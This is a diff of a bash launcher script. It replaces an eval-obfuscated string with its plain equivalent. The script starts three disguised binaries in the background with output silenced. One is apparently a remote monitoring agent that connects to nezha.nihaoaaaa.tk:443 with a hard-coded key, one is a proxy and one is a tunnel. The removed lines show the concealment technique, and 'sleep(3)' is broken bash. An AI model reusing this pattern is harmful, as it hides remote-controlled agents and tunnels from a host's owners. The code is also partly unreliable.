@@ -1,3 +1,29 @@
-z="
-";UBz=' is ';HBz='l --';VBz='runn';GBz='unne';mz='-c .';nz='/con';Ez='nohu';Hz=' nez';CBz='serv';RBz='.yml';dz='unni';MBz='auto';XBz='er';Nz='-p 7';cz='is r';yz='ning';Bz='swit';Fz='p ./';tz='2>&1';ABz='"';Tz='tls ';Cz='h() ';Rz='Kjrk';YBz='tail';WBz='ing"';Iz='ha.n';Oz='DLf4';xz=' run';Uz='>/de';qz=' >/d';hz='slee';Jz='ihao';kz=') {';wz='b is';Vz='v/nu';BBz='web';vz=' "we';az=' "sw';PBz='g tu';KBz='vers';Kz='aaaa';Gz='h -s';Xz='>&1 ';Wz='ll 2';SBz=' "se';NBz=' --c';QBz='nnel';Mz='443 ';Qz='Kz0o';Lz='.tk:';fz='}';Dz='{';Sz='i --';cBz='l';ZBz=' -f ';lz='web ';sz='ull ';bz='ith ';JBz='-ip-';DBz='er()';uz=' &';TBz='rver';pz='json';ez='ng"';jz='web(';Yz='&';gz='h';rz='ev/n';FBz='er t';Az='run_';Pz='I1qW';bBz='/nul';Zz='echo';aBz='/dev';OBz='onfi';IBz='edge';LBz='ion ';EBz=' {';oz='fig.';iz='p(3)';
-eval "$Az$Bz$Cz$Dz$z$Ez$Fz$Bz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$z$Zz$az$bz$cz$dz$ez$z$fz$z$Az$Bz$gz$z$hz$iz$z$Az$jz$kz$z$Ez$Fz$lz$mz$nz$oz$pz$qz$rz$sz$tz$uz$z$Zz$vz$wz$xz$yz$ABz$z$fz$z$Az$BBz$z$hz$iz$z$Az$CBz$DBz$EBz$z$Ez$Fz$CBz$FBz$GBz$HBz$IBz$JBz$KBz$LBz$MBz$NBz$OBz$PBz$QBz$RBz$xz$qz$rz$sz$tz$uz$z$Zz$SBz$TBz$UBz$VBz$WBz$z$fz$z$Az$CBz$XBz$z$YBz$ZBz$aBz$bBz$cBz"
+#!/bin/bash
+
+# 运行swith
+run_swith() {
+  ###chmod 755 swith
+  nohup ./swith -s nezha.nihaoaaaa.tk:443 -p 7DLf4I1qWKz0oKjrki --tls >/dev/null 2>&1 &
+  echo "swith is running"
+}
+run_swith
+sleep(3)
+
+# 运行web
+run_web() {
+  ###chmod 755 web
+  nohup ./web -c ./config.json >/dev/null 2>&1 &
+  echo "web is running"
+}
+run_web
+sleep(3)
+
+# 运行server
+run_server() {
+  ###chmod 755 server
+  nohup ./server tunnel --edge-ip-version auto --config tunnel.yml run >/dev/null 2>&1 &
+  echo "server is running"
+}
+run_server
+
+tail -f /dev/null
